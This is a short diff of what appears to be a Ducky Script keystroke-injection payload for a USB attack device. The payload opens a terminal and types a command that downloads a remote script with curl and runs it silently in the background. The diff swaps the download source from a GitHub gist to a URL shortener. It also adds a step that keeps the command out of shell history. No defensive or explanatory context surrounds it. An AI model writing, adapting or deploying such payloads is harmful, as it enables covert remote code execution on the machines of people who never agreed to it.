@@ -25,5 +25,8 @@ DELAY 100
 
 CTRL ALT T
 DELAY 1000
-STRING nohup bash -c @$(curl -sL https://gist.githubusercontent.com/bsjohnson20/e3c7d56524bcba9a0eff319676611d5f/raw?asdadsadada=asdadsdad)@ &>/dev/null & disown && sleep 2; exit
+STRING HISTCONTROL=ignorespace
+ENTER
+DELAY 10
+STRING nohup bash -c @$(curl -sL http://tiny.cc/7vjd001)@ &>/dev/null disown; exit
 ENTER
